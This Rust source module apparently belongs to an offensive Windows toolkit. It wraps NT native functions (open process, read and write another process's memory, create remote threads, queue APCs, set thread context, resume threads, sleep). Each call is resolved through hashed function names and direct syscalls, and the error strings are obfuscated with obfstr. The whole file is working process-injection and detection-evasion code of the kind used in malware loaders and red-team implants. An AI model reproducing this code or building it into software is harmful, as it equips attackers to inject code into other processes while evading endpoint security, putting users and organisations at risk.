use crate::syscall;
use crate::api::def::{THREAD_ALL_ACCESS, CURRENT_PROCESS};
use super::types::*;

pub fn create_remote_thread_ex(process_handle: isize, start: usize, arg: usize) -> Result<isize, String> {
    use std::ffi::c_void;
    use obfstr::obfstr;

    let mut thread_handle: isize = 0;
    let nt_create_hash = crate::dbj2_hash!(b"NtCreateThreadEx");

    let status = syscall!(
        nt_create_hash,
        NtCreateThreadExFn,
        (&mut thread_handle as *mut isize as u64),
        THREAD_ALL_ACCESS as u64,
        core::ptr::null_mut::<c_void>() as u64,
        process_handle as u64,
        (start as *mut c_void) as u64,
        (arg as *mut c_void) as u64,
        0u32 as u64,
        0usize as u64,
        0usize as u64,
        0usize as u64,
        core::ptr::null_mut::<c_void>() as u64,
    );

    match status {
        Some(s) => {
            if s < 0 {
                return Err(format!("{}: {:#x}", obfstr!("NtCreateThreadEx failed"), s));
            }
        }
        None => {
            return Err(obfstr!("Failed to resolve NtCreateThreadEx").to_string());
        }
    }

    Ok(thread_handle)
}

pub fn create_thread_ex(start: usize, arg: usize) -> Result<isize, String> {
    create_remote_thread_ex(CURRENT_PROCESS, start, arg)
}

pub fn wait_for_single_object(handle: isize) -> i32 {
    let nt_wait_hash = crate::dbj2_hash!(b"NtWaitForSingleObject");
    syscall!(nt_wait_hash, NtWaitForSingleObjectFn, handle as u64, 0u8 as u64, core::ptr::null_mut::<i64>() as u64).unwrap_or(-1)
}

pub fn close_handle(handle: isize) {
    let nt_close_hash = crate::dbj2_hash!(b"NtClose");
    let _ = syscall!(nt_close_hash, NtCloseFn, handle as u64);
}

pub fn queue_apc_thread(thread_handle: isize, routine: usize) -> Result<(), String> {
    use core::ffi::c_void;
    use obfstr::obfstr;

    let nt_queue_hash = crate::dbj2_hash!(b"NtQueueApcThread");

    let qstatus = syscall!(
        nt_queue_hash,
        NtQueueApcThreadFn,
        thread_handle,
        routine as *mut c_void,
        core::ptr::null_mut::<c_void>(),
        core::ptr::null_mut::<c_void>(),
        core::ptr::null_mut::<c_void>(),
    )
    .ok_or_else(|| obfstr!("Failed to resolve NtQueueApcThread").to_string())?;

    if qstatus < 0 {
        return Err(format!("{}: {:#x}", obfstr!("NtQueueApcThread failed"), qstatus));
    }

    Ok(())
}

pub fn query_system_information(info_class: u32, buffer: *mut u8, size: u32, return_len: *mut u32) -> Result<i32, String> {
    use core::ffi::c_void;
    use obfstr::obfstr;

    let nt_query_sys_hash = crate::dbj2_hash!(b"NtQuerySystemInformation");

    let status = syscall!(
        nt_query_sys_hash,
        NtQuerySystemInformationFn,
        info_class as u64,
        (buffer as *mut c_void) as u64,
        size as u64,
        return_len as u64
    ).ok_or_else(|| obfstr!("Failed to resolve NtQuerySystemInformation").to_string())?;

    Ok(status)
}

pub fn duplicate_object(
    source_process_handle: isize,
    source_handle: isize,
    target_process_handle: isize,
    target_handle: *mut isize,
    desired_access: u32,
    handle_attributes: u32,
    options: u32,
) -> Result<i32, String> {
    use obfstr::obfstr;

    let nt_dup_hash = crate::dbj2_hash!(b"NtDuplicateObject");

    let status = syscall!(
        nt_dup_hash,
        NtDuplicateObjectFn,
        source_process_handle as u64,
        source_handle as u64,
        target_process_handle as u64,
        target_handle as u64,
        desired_access as u64,
        handle_attributes as u64,
        options as u64
    ).ok_or_else(|| obfstr!("Failed to resolve NtDuplicateObject").to_string())?;

    Ok(status)
}

pub fn query_object(
    handle: isize,
    object_information_class: u32,
    object_information: *mut core::ffi::c_void,
    object_information_length: u32,
    return_length: *mut u32,
) -> Result<i32, String> {
    use obfstr::obfstr;

    let nt_query_obj_hash = crate::dbj2_hash!(b"NtQueryObject");

    let status = syscall!(
        nt_query_obj_hash,
        NtQueryObjectFn,
        handle as u64,
        object_information_class as u64,
        object_information as u64,
        object_information_length as u64,
        return_length as u64
    ).ok_or_else(|| obfstr!("Failed to resolve NtQueryObject").to_string())?;

    Ok(status)
}

pub fn set_io_completion(
    io_completion_handle: isize,
    key_context: *mut core::ffi::c_void,
    apc_context: *mut core::ffi::c_void,
    io_status: i32,
    io_status_information: usize,
) -> Result<i32, String> {
    use obfstr::obfstr;

    let nt_set_io_hash = crate::dbj2_hash!(b"NtSetIoCompletion");

    let status = syscall!(
        nt_set_io_hash,
        NtSetIoCompletionFn,
        io_completion_handle as u64,
        key_context as u64,
        apc_context as u64,
        io_status as u64,
        io_status_information as u64
    ).ok_or_else(|| obfstr!("Failed to resolve NtSetIoCompletion").to_string())?;

    Ok(status)
}

pub fn test_alert() -> Result<(), String> {
    use obfstr::obfstr;

    let nt_test_alert_hash = crate::dbj2_hash!(b"NtTestAlert");

    let status = syscall!(
        nt_test_alert_hash,
        NtTestAlertFn,
    ).ok_or_else(|| obfstr!("Failed to resolve NtTestAlert").to_string())?;

    if status < 0 {
        return Err(format!("{}: {:#x}", obfstr!("NtTestAlert failed"), status));
    }
    Ok(())
}

pub fn set_context_thread(thread_handle: isize, context: *const std::ffi::c_void) -> Result<(), String> {
    use obfstr::obfstr;

    let nt_set_context_hash = crate::dbj2_hash!(b"NtSetContextThread");

    let status = syscall!(
        nt_set_context_hash,
        NtSetContextThreadFn,
        thread_handle as u64,
        context as u64
    ).ok_or_else(|| obfstr!("Failed to resolve NtSetContextThread").to_string())?;

    if status < 0 {
        return Err(format!("{}: {:#x}", obfstr!("NtSetContextThread failed"), status));
    }
    Ok(())
}

pub fn resume_thread(thread_handle: isize) -> Result<u32, String> {
    use obfstr::obfstr;

    let nt_resume_hash = crate::dbj2_hash!(b"NtResumeThread");
    let mut suspend_count = 0;

    let status = syscall!(
        nt_resume_hash,
        NtResumeThreadFn,
        thread_handle as u64,
        (&mut suspend_count as *mut u32 as u64)
    ).ok_or_else(|| obfstr!("Failed to resolve NtResumeThread").to_string())?;

    if status < 0 {
        return Err(format!("{}: {:#x}", obfstr!("NtResumeThread failed"), status));
    }
    Ok(suspend_count)
}

pub fn open_process(pid: u32, access: u32) -> Result<isize, String> {
    use obfstr::obfstr;
    use std::ffi::c_void;

    let mut handle: isize = 0;
    let mut client_id = ClientId {
        unique_process: pid as isize,
        unique_thread: 0,
    };
    let mut oa = ObjectAttributes {
        length: std::mem::size_of::<ObjectAttributes>() as u32,
        root_directory: 0,
        object_name: core::ptr::null_mut(),
        attributes: 0,
        security_descriptor: core::ptr::null_mut(),
        security_quality_of_service: core::ptr::null_mut(),
    };

    let nt_open_hash = crate::dbj2_hash!(b"NtOpenProcess");

    let status = syscall!(
        nt_open_hash,
        NtOpenProcessFn,
        (&mut handle as *mut isize as u64),
        access as u64,
        (&mut oa as *mut ObjectAttributes as u64),
        (&mut client_id as *mut ClientId as u64)
    ).ok_or_else(|| obfstr!("Failed to resolve NtOpenProcess").to_string())?;

    if status < 0 {
        return Err(format!("NtOpenProcess failed: {:#x}", status));
    }

    Ok(handle)
}

pub fn read_virtual_memory(process_handle: isize, base_addr: usize, buffer: &mut [u8]) -> Result<usize, String> {
    use core::ffi::c_void;
    use obfstr::obfstr;

    let mut bytes_read: usize = 0;
    let nt_read_hash = crate::dbj2_hash!(b"NtReadVirtualMemory");

    let status = syscall!(
        nt_read_hash,
        NtReadVirtualMemoryFn,
        process_handle as u64,
        (base_addr as *mut c_void) as u64,
        (buffer.as_mut_ptr() as *mut c_void) as u64,
        buffer.len() as u64,
        (&mut bytes_read as *mut usize as u64)
    ).ok_or_else(|| obfstr!("Failed to resolve NtReadVirtualMemory").to_string())?;

    if status < 0 {
        return Err(format!("NtReadVirtualMemory failed: {:#x}", status));
    }

    Ok(bytes_read)
}

pub fn write_virtual_memory(process_handle: isize, base_addr: usize, buffer: &[u8]) -> Result<usize, String> {
    use core::ffi::c_void;
    use obfstr::obfstr;

    let mut bytes_written: usize = 0;
    let nt_write_hash = crate::dbj2_hash!(b"NtWriteVirtualMemory");

    let status = syscall!(
        nt_write_hash,
        NtWriteVirtualMemoryFn,
        process_handle as u64,
        (base_addr as *mut c_void) as u64,
        (buffer.as_ptr() as *mut c_void) as u64,
        buffer.len() as u64,
        (&mut bytes_written as *mut usize as u64)
    ).ok_or_else(|| obfstr!("Failed to resolve NtWriteVirtualMemory").to_string())?;

    if status < 0 {
        return Err(format!("NtWriteVirtualMemory failed: {:#x}", status));
    }

    Ok(bytes_written)
}

pub fn delay_execution_seconds(seconds: i64) -> Result<(), String> {
    use obfstr::obfstr;

    let nt_delay_hash = crate::dbj2_hash!(b"NtDelayExecution");
    let mut interval: i64 = -10_000_000 * seconds; // 100-ns units

    let dstatus = syscall!(
        nt_delay_hash,
        NtDelayExecutionFn,
        1u8 as u64,
        (&mut interval as *mut i64 as u64)
    )
    .ok_or_else(|| obfstr!("Failed to resolve NtDelayExecution").to_string())?;

    if dstatus < 0 {
        return Err(format!("NtDelayExecution failed: {:#x}", dstatus));
    }

    Ok(())
}

pub fn query_information_process(
    process_handle: isize,
    process_information_class: u32,
    process_information: *mut core::ffi::c_void,
    process_information_length: u32,
    return_length: *mut u32,
) -> Result<i32, String> {
    use core::ffi::c_void;
    use obfstr::obfstr;

    let nt_query_hash = crate::dbj2_hash!(b"NtQueryInformationProcess");

    let status = syscall!(
        nt_query_hash,
        NtQueryInformationProcessFn,
        process_handle as u64,
        process_information_class as u64,
        process_information as u64,
        process_information_length as u64,
        return_length as u64
    ).ok_or_else(|| obfstr!("Failed to resolve NtQueryInformationProcess").to_string())?;

    Ok(status)
}